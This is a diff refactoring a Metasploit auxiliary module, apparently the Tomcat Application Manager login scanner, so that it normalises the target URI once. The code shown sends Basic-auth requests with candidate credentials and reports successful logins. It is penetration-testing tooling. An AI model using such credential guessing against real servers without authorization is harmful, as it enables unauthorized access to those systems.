@@ -72,18 +72,19 @@ class Metasploit3 < Msf::Auxiliary
 
 	def run_host(ip)
 		begin
+			uri = normalize_uri(datastore['URI'])
 			res = send_request_cgi({
-				'uri'     => "#{datastore['URI']}",
+				'uri'     => uri,
 				'method'  => 'GET'
 				}, 25)
 			http_fingerprint({ :response => res })
 		rescue ::Rex::ConnectionError => e
-			vprint_error("http://#{rhost}:#{rport}#{datastore['URI']} - #{e}")
+			vprint_error("http://#{rhost}:#{rport}#{uri} - #{e}")
 			return
 		end
 
 		if not res
-			vprint_error("http://#{rhost}:#{rport}#{datastore['URI']} - No response")
+			vprint_error("http://#{rhost}:#{rport}#{uri} - No response")
 			return
 		end
 		if res.code != 401
@@ -101,10 +102,10 @@ class Metasploit3 < Msf::Auxiliary
 		success = false
 		srvhdr = '?'
 		user_pass = Rex::Text.encode_base64(user + ":" + pass)
-
+		uri = normalize_uri(datastore['URI'])
 		begin
 			res = send_request_cgi({
-				'uri'     => "#{datastore['URI']}",
+				'uri'     => uri,
 				'method'  => 'GET',
 				'headers' =>
 					{
@@ -112,7 +113,7 @@ class Metasploit3 < Msf::Auxiliary
 					}
 				}, 25)
 			unless (res.kind_of? Rex::Proto::Http::Response)
-				vprint_error("http://#{rhost}:#{rport}#{datastore['URI']} not responding")
+				vprint_error("http://#{rhost}:#{rport}#{uri} not responding")
 				return :abort
 			end
 			return :abort if (res.code == 404)
@@ -126,12 +127,12 @@ class Metasploit3 < Msf::Auxiliary
 			end
 
 		rescue ::Rex::ConnectionError => e
-			vprint_error("http://#{rhost}:#{rport}#{datastore['URI']} - #{e}")
+			vprint_error("http://#{rhost}:#{rport}#{uri} - #{e}")
 			return :abort
 		end
 
 		if success
-			print_good("http://#{rhost}:#{rport}#{datastore['URI']} [#{srvhdr}] [Tomcat Application Manager] successful login '#{user}' : '#{pass}'")
+			print_good("http://#{rhost}:#{rport}#{uri} [#{srvhdr}] [Tomcat Application Manager] successful login '#{user}' : '#{pass}'")
 			report_auth_info(
 				:host => rhost,
 				:port => rport,
@@ -146,7 +147,7 @@ class Metasploit3 < Msf::Auxiliary
 
 			return :next_user
 		else
-			vprint_error("http://#{rhost}:#{rport}#{datastore['URI']} [#{srvhdr}] [Tomcat Application Manager] failed to login as '#{user}'")
+			vprint_error("http://#{rhost}:#{rport}#{uri} [#{srvhdr}] [Tomcat Application Manager] failed to login as '#{user}'")
 			return
 		end
 	end
